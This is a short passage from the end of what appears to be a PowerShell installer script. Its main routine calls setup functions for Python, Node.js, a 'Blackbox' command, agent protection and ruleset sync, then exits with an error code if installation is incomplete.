    Resolve-Python
    Test-NodeJs

    Resolve-Repo
    Install-PythonEnv
    Install-BlackboxCommand
    Install-Dkg
    Enable-AndConfigure
    Configure-BlackboxMode
    Protect-AllAgents
    Sync-Ruleset
    Show-NextSteps
    if ($script:InstallIncomplete) {
        exit 1
    }
}

Main
